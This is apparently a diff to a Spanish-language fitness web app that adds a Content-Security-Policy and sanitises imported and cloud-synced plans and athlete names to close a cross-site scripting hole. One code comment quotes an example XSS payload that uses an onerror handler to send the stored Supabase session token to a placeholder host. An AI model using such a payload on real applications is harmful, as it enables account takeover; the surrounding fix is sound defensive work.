@@ -4,6 +4,11 @@
 <meta charset="utf-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
 <meta name="theme-color" content="#0e1014">
+<!-- Red de seguridad por si algun dia se cuela un dato sin escapar: sin
+     'unsafe-inline' en script-src no se ejecutaria un <img onerror=...> inyectado.
+     'unsafe-eval' hace falta para WebAssembly del Modo IA; los connect-src son los
+     tres servidores que la app usa de verdad (Supabase, jsdelivr, esm.run). -->
+<meta http-equiv="Content-Security-Policy" content="default-src 'self'; script-src 'self' 'unsafe-eval' https://esm.run https://cdn.jsdelivr.net; style-src 'self' 'unsafe-inline'; img-src 'self' data: blob: https://cdn.jsdelivr.net; connect-src 'self' https://*.supabase.co https://cdn.jsdelivr.net https://esm.run https://raw.githubusercontent.com https://huggingface.co https://*.hf.co; worker-src 'self' blob:; object-src 'none'; base-uri 'self'; form-action 'none'">
 <meta name="apple-mobile-web-app-capable" content="yes">
 <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
 <meta name="apple-mobile-web-app-title" content="Atlas IA">
@@ -1911,6 +1916,55 @@ function askResolve(v){
   $("#askModal").classList.remove("on");
   if(_askRes){ const r=_askRes; _askRes=null; r(v); }
 }
+/* =====================  SANEADO DE LO QUE VIENE DE FUERA  =====================
+
+   EL AGUJERO QUE CIERRA. Un plan puede llegar de tres sitios que NO controlamos:
+   el JSON que importas ("Importar" y "Anadir atleta de otro movil") y lo que baja
+   de la nube. Ese plan se pinta despues con innerHTML en una docena de sitios y
+   sus ids se meten dentro de onclick="fn('...')". Un archivo preparado con
+
+       cues: ["<img src=x onerror=fetch('https://malo/?r='+localStorage.atlas_nube_sesion)>"]
+
+   ejecutaba codigo en el origen de la app nada mas importarlo -importData hace
+   DB=o y repinta en la misma sesion- y se llevaba el token de Supabase, o sea la
+   cuenta entera. Con el id se conseguia lo mismo rompiendo el atributo.
+
+   SE SANEA AQUI, EN LA FRONTERA, y no en los treinta sitios donde se pinta: es un
+   punto en vez de treinta, y lo que ya esta guardado no puede volverse peligroso
+   despues. Los ids se recortan a [a-z0-9_] porque van dentro de comillas simples
+   en manejadores inline, donde escapar a HTML no basta. */
+const TXT_SEGURO = s => String(s == null ? '' : s)
+  .replace(/[&<>"']/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[c]))
+  .slice(0, 300);
+const ID_SEGURO = s => String(s == null ? '' : s).replace(/[^a-zA-Z0-9_]/g, '').slice(0, 60);
+
+function planLimpio(plan){
+  if(!Array.isArray(plan)) return [];
+  return plan.slice(0, 14).map(d => Object.assign({}, d, {
+    id:    ID_SEGURO(d.id),
+    short: TXT_SEGURO(d.short),
+    title: TXT_SEGURO(d.title),
+    focus: TXT_SEGURO(d.focus),
+    why:   TXT_SEGURO(d.why),
+    wd:    Number.isFinite(+d.wd) ? +d.wd : 0,
+    ex: (Array.isArray(d.ex) ? d.ex : []).slice(0, 40).map(e => Object.assign({}, e, {
+      id:    ID_SEGURO(e.id),
+      n:     TXT_SEGURO(e.n),
+      sr:    TXT_SEGURO(e.sr),
+      rir:   TXT_SEGURO(e.rir),
+      rest:  TXT_SEGURO(e.rest),
+      tempo: TXT_SEGURO(e.tempo),
+      art:   ID_SEGURO(e.art),
+      cues:  (Array.isArray(e.cues) ? e.cues : []).slice(0, 10).map(TXT_SEGURO),
+      sets:  Number.isFinite(+e.sets) ? +e.sets : 3,
+    })),
+  }));
+}
+/* El nombre del atleta tambien viaja en esos archivos y acaba dentro de
+   onclick="selectProfile('...')" en renderProfiles. Comprobado explotable. */
+const NOMBRE_SEGURO = s => String(s == null ? '' : s)
+  .replace(/[<>"'`\\&]/g, '').replace(/\s+/g, ' ').trim().slice(0, 24);
+
 /* Borra un usuario y TODOS sus datos (series, fotos, plan). */
 async function deleteUser(name, ev){
   if(ev) ev.stopPropagation();
@@ -1966,6 +2020,7 @@ async function deleteUser(name, ev){
   toast(name+" eliminado");
 }
 function addProfileEntry(name){
+  name = NOMBRE_SEGURO(name);       // nunca un nombre con comillas ni etiquetas
   let extra={}; try{ extra=JSON.parse(localStorage.getItem("atlas_profiles")||"{}"); }catch(e){}
   const used=Object.keys({...DEFAULT_PROFILES, ...extra}).length;
   extra[name]=PROFILE_COLORS[used % PROFILE_COLORS.length];
@@ -2103,7 +2158,7 @@ function renderDayChips(){
   const wd = new Date().getDay();
   $("#days").innerHTML = DAYS.map((d,i)=>{
     const isToday = (wd in dayByWeekday) && dayByWeekday[wd]===i;
-    return `<div class="chip ${i===curIdx?'on':''}" onclick="setDay(${i})">${d.short}${isToday?' <span class="dot">●</span>':''}</div>`;
+    return `<div class="chip ${i===curIdx?'on':''}" onclick="setDay(${i})">${duoEsc(d.short)}${isToday?' <span class="dot">●</span>':''}</div>`;
   }).join("") + (()=>{ // chip de descanso: los días de la semana que no entrenas
       const names=['Dom','Lun','Mar','Mié','Jue','Vie','Sáb'];
       const rest=[1,2,3,4,5,6,0].filter(w=>!(w in dayByWeekday)).map(w=>names[w]);
@@ -2753,11 +2808,12 @@ function exportPrompt(){
    te reenvia el archivo y lo vuelves a importar encima. Sincronizar de verdad
    pedia servidor y cuentas cruzadas; para entrenar juntos una semana no compensa. */
 function guardarAtletaImportado(nombre, o){
-  nombre=String(nombre||'').trim().slice(0,20);
+  nombre=NOMBRE_SEGURO(nombre);
   if(!nombre) throw new Error('hace falta un nombre');
   if(nombre===PROFILE) throw new Error('ese es tu propio nombre');
   const d=JSON.parse(JSON.stringify(o||{}));
   delete d.__fotos; delete d.__nombre;
+  d.plan=planLimpio(d.plan);          // frontera: viene del movil de otra persona
   d.logs=d.logs||{}; d.done=d.done||{}; d.body=d.body||[]; d.oneRM=d.oneRM||{}; d.photos=d.photos||[];
   localStorage.setItem('recomp_v1_'+nombre, JSON.stringify(d));
   /* Si ese nombre estaba en la lapida de borrados, se levanta: lo acabas de
@@ -2815,6 +2871,7 @@ function importData(){
   inp.onchange=()=>{const f=inp.files[0];const r=new FileReader();
     r.onload=async ()=>{try{
         const o=JSON.parse(r.result);
+        o.plan=planLimpio(o.plan);        // frontera: el archivo es de fuera
         const fotos=o.__fotos||{}; delete o.__fotos;     // backups viejos no las traen
         DB=o;DB.logs=DB.logs||{};DB.done=DB.done||{};DB.body=DB.body||[];DB.oneRM=DB.oneRM||{};DB.photos=DB.photos||[];
         let n=0;
@@ -3281,10 +3338,10 @@ function renderProfiles(){
   $("#profiles").innerHTML = Object.keys(PROFILES).map(name=>{
     const c=PROFILES[name];
     const cur = name===PROFILE;
-    return `<div class="profcard ${cur?'cur':''}" onclick="selectProfile('${name}')">
-      <button class="profdel" title="Borrar ${name}" aria-label="Borrar ${name}" onclick="deleteUser('${name}',event)">✕</button>
-      <div class="pavatar" style="background:${c}">${name[0]}</div>
-      ${name}
+    return `<div class="profcard ${cur?'cur':''}" onclick="selectProfile('${duoEsc(name)}')">
+      <button class="profdel" title="Borrar ${duoEsc(name)}" aria-label="Borrar ${duoEsc(name)}" onclick="deleteUser('${duoEsc(name)}',event)">✕</button>
+      <div class="pavatar" style="background:${c}">${duoEsc(name[0])}</div>
+      ${duoEsc(name)}
       <small>${cur?'usuario actual':'tocar para entrar'}</small>
     </div>`;
   }).join("") + `
@@ -10958,7 +11015,7 @@ function renderPlanSlide(){
 
     <div class="ssec">
       <h3>Tu semana</h3>
-      ${DAYS.map(d=>`<div class="sday"><span class="wd">${d.short}</span>
+      ${DAYS.map(d=>`<div class="sday"><span class="wd">${duoEsc(d.short)}</span>
         <span class="tt">${d.title.split('— ')[1]||d.title}<br><span style="color:var(--muted);font-size:11px">${d.focus}</span></span>
         <span class="mn">${d.estMin||dayMinutes(d)} min</span></div>`).join('')}
       ${p.days<6?`<div class="sday"><span class="wd" style="color:var(--muted)">Resto</span><span class="tt" style="color:var(--muted)">Descanso · sueño 7–9 h</span><span class="mn">—</span></div>`:''}
@@ -13177,7 +13234,10 @@ async function nubeBajar(){
     const filas=await nubeFetch('/rest/v1/atletas?select=id,nombre,color,data,updated_at');
     let extra={}; try{ extra=JSON.parse(localStorage.getItem('atlas_profiles')||'{}'); }catch(e){}
     (filas||[]).forEach(f=>{
-      localStorage.setItem('recomp_v1_'+f.nombre, JSON.stringify(f.data||{}));
+      /* Tambien frontera: la fila pudo escribirla otro cliente, o tu mismo desde
+         un movil donde ya habias importado algo con veneno dentro. */
+      const dat=f.data||{}; dat.plan=planLimpio(dat.plan);
+      localStorage.setItem('recomp_v1_'+f.nombre, JSON.stringify(dat));
       if(!DEFAULT_PROFILES[f.nombre]) extra[f.nombre]=f.color||PROFILE_COLORS[Object.keys(extra).length%PROFILE_COLORS.length];
       nubeGuardaId(f.nombre, f.id, f.updated_at);
     });
